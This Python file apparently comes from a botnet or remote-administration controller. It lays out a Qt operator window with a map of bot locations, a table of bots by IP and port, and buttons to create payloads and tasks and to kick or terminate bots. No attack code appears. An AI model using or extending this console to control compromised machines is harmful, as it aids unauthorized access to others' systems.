import os
import sys

from qtpy.QtWidgets import (QWidget, QHBoxLayout, QVBoxLayout, QPushButton, QTableView, QFrame, QAbstractItemView,
                            QTableWidget, QSizePolicy, QAbstractScrollArea, QHeaderView, QSplitter)
from qtpy.QtCore import QSize, Qt, Slot, QModelIndex, Signal
from qtpy.QtGui import QIcon

from qrainbowstyle.widgets import GoogleMapsView

from models import Bot
from models.BotTable import TableModel
from view.MainWindow.Widgets import MainWindowButton


class MainWidget(QWidget):
    bot_double_clicked = Signal(Bot)
    task_button_clicked = Signal()
    payload_button_clicked = Signal()
    bot_clicked = Signal(int)
    load_finished = Signal()

    def __init__(self, parent):
        super(MainWidget, self).__init__(parent)
        self.mainLayout = QHBoxLayout(self)
        self.mainLayout.setSpacing(11)
        self.setLayout(self.mainLayout)

    def setupUi(self, config):
        self.map = GoogleMapsView(self, config.get("gmaps_key"))
        self.map.getHandler().markerDoubleClicked.connect(lambda bot_id, lat, lng: self.bot_double_clicked.emit(
            self.tableModel.getDeviceById(int(bot_id))))
        self.map.getHandler().markerClicked.connect(self.bot_clicked.emit)

        self.map.setObjectName("mapWidget")
        self.map.enableMarkersDragging(False)
        self.map.loadFinished.connect(self.load_finished.emit)

        self.botsTable = QTableView(self)
        self.botsTable.doubleClicked.connect(self.on_botTable_doubleClicked)
        self.botsTable.setObjectName("botsTable")
        self.botsTable.setAutoFillBackground(True)
        self.botsTable.setFrameShape(QFrame.StyledPanel)
        self.botsTable.setFrameShadow(QFrame.Sunken)
        self.botsTable.setVerticalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        self.botsTable.setHorizontalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        self.botsTable.setSizeAdjustPolicy(QAbstractScrollArea.AdjustToContents)
        self.botsTable.setVerticalScrollMode(QAbstractItemView.ScrollPerPixel)
        self.botsTable.setHorizontalScrollMode(QAbstractItemView.ScrollPerPixel)
        self.botsTable.setGridStyle(Qt.SolidLine)
        self.botsTable.horizontalHeader().setStretchLastSection(True)
        self.botsTable.setContextMenuPolicy(Qt.CustomContextMenu)

        hheader = self.botsTable.horizontalHeader()
        hheader.setDefaultSectionSize(150)
        hheader.setMinimumSectionSize(150)
        hheader.setMouseTracking(True)

        vheader = self.botsTable.verticalHeader()
        vheader.setCascadingSectionResizes(True)
        vheader.setDefaultSectionSize(35)
        vheader.setSortIndicatorShown(False)
        vheader.setStretchLastSection(False)
        vheader.setVisible(False)

        self.botsTable.setEditTriggers(QTableWidget.NoEditTriggers)
        self.botsTable.setSelectionMode(QAbstractItemView.ExtendedSelection)
        self.botsTable.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.tableModel = TableModel(self)
        self.tableModel.setObjectName("tableModel")
        self.tableModel.removed.connect(self.map.deleteMarker)
        self.botsTable.setModel(self.tableModel)

        for i in range(self.tableModel.columnCount()):
            self.botsTable.horizontalHeader().setSectionResizeMode(i, QHeaderView.Stretch)

        self.splitter = QSplitter(self)
        self.splitter.addWidget(self.map)
        self.splitter.addWidget(self.botsTable)
        self.splitter.setOrientation(Qt.Vertical)

        self.mainLayout.addWidget(self.splitter)

        sizepolicy = QSizePolicy(QSizePolicy.Minimum, QSizePolicy.Minimum)
        sizepolicy.setHorizontalStretch(0)
        sizepolicy.setVerticalStretch(0)

        self.buttonsWidget = QWidget(self)
        self.buttonsWidget.setContentsMargins(0, 0, 0, 0)
        self.buttonsWidgetLayout = QVBoxLayout(self.buttonsWidget)
        self.buttonsWidgetLayout.setContentsMargins(0, 0, 0, 0)
        self.buttonsWidgetLayout.setAlignment(Qt.AlignTop)
        self.buttonsWidget.setLayout(self.buttonsWidgetLayout)

        self.payload_button = MainWindowButton(self.buttonsWidget)
        self.payload_button.setToolTip("Create payload")
        self.payload_button.clicked.connect(self.payload_button_clicked.emit)
        self.payload_button.setIcon(QIcon(os.path.join(sys.path[0], "resources/icons/3d-cube-sphere.svg")))

        self.task_button = MainWindowButton(self.buttonsWidget)
        self.task_button.setToolTip("Create tasks")
        self.task_button.clicked.connect(self.task_button_clicked.emit)
        self.task_button.setIcon(QIcon(os.path.join(sys.path[0], "resources/icons/list-check.svg")))

        self.disconnect_button = MainWindowButton(self.buttonsWidget)
        self.disconnect_button.setToolTip("Kick")
        self.disconnect_button.setIcon(QIcon(os.path.join(sys.path[0], "resources/icons/wifi-off.svg")))

        self.terminate_button = MainWindowButton(self.buttonsWidget)
        self.terminate_button.setToolTip("Terminate")
        self.terminate_button.setIcon(QIcon(os.path.join(sys.path[0], "resources/icons/user-off.svg")))

        self.close_button = MainWindowButton(self.buttonsWidget)
        self.close_button.setToolTip("Close")
        self.close_button.clicked.connect(self.window().closeClicked.emit)
        self.close_button.setIcon(QIcon(os.path.join(sys.path[0], "resources/icons/x.svg")))

        self.buttonsWidgetLayout.addWidget(self.payload_button)
        self.buttonsWidgetLayout.addWidget(self.task_button)
        self.buttonsWidgetLayout.addWidget(self.terminate_button)
        self.buttonsWidgetLayout.addWidget(self.disconnect_button)
        self.buttonsWidgetLayout.addStretch(1)
        self.buttonsWidgetLayout.addWidget(self.close_button)

        self.mainLayout.addWidget(self.buttonsWidget)

    @Slot(QModelIndex)
    def on_botTable_doubleClicked(self, index: QModelIndex):
        self.bot_double_clicked.emit(self.tableModel.getDeviceById(self.tableModel.index(index.row(), 0).data()))

    def add_bot(self, bot_id, ip, port, kwargs={}):
        bot = Bot(None, bot_id, ip, port, **kwargs)
        bot.update_map.connect(lambda marker_id, loc: self.map.addMarker(marker_id, loc[0], loc[1]))
        self.tableModel.appendDevice(bot)

    def update_bot(self, bot_id, kwargs):
        self.tableModel.updateDevice(bot_id, kwargs)

    def remove_bot(self, bot_id):
        self.tableModel.removeDevice(bot_id)
